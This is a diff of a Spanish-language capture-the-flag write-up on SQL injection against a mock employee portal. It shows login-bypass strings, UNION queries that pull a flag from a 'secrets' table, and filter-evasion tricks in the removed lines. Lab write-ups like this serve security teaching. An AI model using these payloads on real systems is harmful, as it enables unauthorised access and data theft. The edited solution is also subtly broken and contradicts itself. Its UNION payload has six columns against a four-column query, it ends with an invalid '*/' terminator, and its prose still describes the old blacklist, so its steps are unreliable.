@@ -102,7 +102,7 @@ La inyección SQL ocurre cuando una aplicación incorpora datos del usuario dire
 ### Descripción del challenge
 
 El portal de empleados de IntraCorp tiene:
-1. **Login con blacklist débil** — bloquea `union`, `select`, `--`, `#`, `/*` pero NO bloquea `OR`.
+1. **Login con blacklist débil** — bloquea `delete`, `drop`,`insert`, `--`,  pero NO bloquea `*/`,`/**/`.
 2. **Módulo de búsqueda de sneakers** — ejecuta queries directamente sobre la base de datos.
 
 La flag está en la tabla `secrets`. El módulo de búsqueda también tiene una blacklist pero admite técnicas de ofuscación.
@@ -112,13 +112,13 @@ La flag está en la tabla `secrets`. El módulo de búsqueda también tiene una 
 El login bloquea palabras exactas pero no la condición `OR`. Usar:
 
 ```
-Usuario:   cn' OR '1'='1
-Password:  cualquier_cosa
+Usuario:   cualquier_cosa
+Password:  cn' OR '1'='1
 ```
 
 Esto genera la query:
 ```sql
-SELECT id, username, role FROM users WHERE username='cn' OR '1'='1' AND password='...'
+SELECT id, username, role FROM users WHERE username='...' AND password='cn' OR '1'='1'
 ```
 Y devuelve el primer usuario de la tabla (super_user).
 
@@ -130,26 +130,9 @@ Una vez dentro, ir a **Buscar**. El campo de búsqueda ejecuta:
 SELECT id, brand, model, price FROM sneakers WHERE brand LIKE '%INPUT%' OR model LIKE '%INPUT%'
 ```
 
-La blacklist bloquea `union` y `select` como cadenas literales, pero no bloquea versiones con comillas intercaladas:
-
 ```sql
-cn' UNION SELECT 1, flag, 3, 4 FROM secrets-- -
+cn' UNION SELECT 1, flag, 3, 4,5,6 FROM secrets */
 ```
-
-Si el filtro bloquea `union` o `select`, usar comillas para romper las palabras:
-
-```
-cn' un'ion sel'ect 1, flag, 3, 4 fr'om secrets-- -
-```
-
-O aprovechando que SQLite admite comentarios inline:
-
-```
-cn' UNION/**/SELECT/**/1,flag,3,4/**/FROM/**/secrets-- -
-```
-
-**Resultado:** La flag aparece en la columna 2 de los resultados.
-
 ```
 flag{sqli_filter_bypass}
 ```
